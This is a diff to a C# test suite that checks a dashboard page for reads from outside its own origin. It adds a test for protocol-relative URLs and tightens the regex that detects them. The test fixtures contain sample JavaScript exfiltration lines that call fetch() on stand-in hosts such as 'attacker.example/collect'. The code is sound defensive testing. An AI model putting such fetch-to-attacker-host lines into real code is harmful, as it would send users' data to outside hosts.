@@ -552,6 +552,9 @@ public class FleetGlassReadOnlyTests
             """const exfiltrate = () => fetch("https://example.invalid/collect");"""));
         Assert.NotEmpty(SameOriginReadViolations(
             """const events = new EventSource(someOperatorSuppliedUrl);"""));
+        // A protocol-relative URL starts with a slash and is not same-origin (#2028 review).
+        Assert.NotEmpty(SameOriginReadViolations(
+            """const exfiltrate = () => fetch("//attacker.example/collect");"""));
         Assert.False(
             Regex.IsMatch(
                 """fetch("/projection.json", { method: "GET" })""",
@@ -584,7 +587,9 @@ public class FleetGlassReadOnlyTests
         foreach (Match match in Regex.Matches(script, @"(?:\bfetch|\bnew\s+EventSource)\s*\(\s*([^,)]*)"))
         {
             var argument = match.Groups[1].Value.Trim();
-            if (!Regex.IsMatch(argument, @"^(""|')/"))
+            // `(?!/)` is load-bearing: "//host/..." is protocol-relative, satisfies a bare `^("|')/`,
+            // and resolves to a DIFFERENT origin.
+            if (!Regex.IsMatch(argument, @"^(""|')/(?!/)"))
             {
                 violations.Add(
                     $"glass.html reads from a non-same-origin or unreadable URL: `{match.Value.Trim()}` — every " +
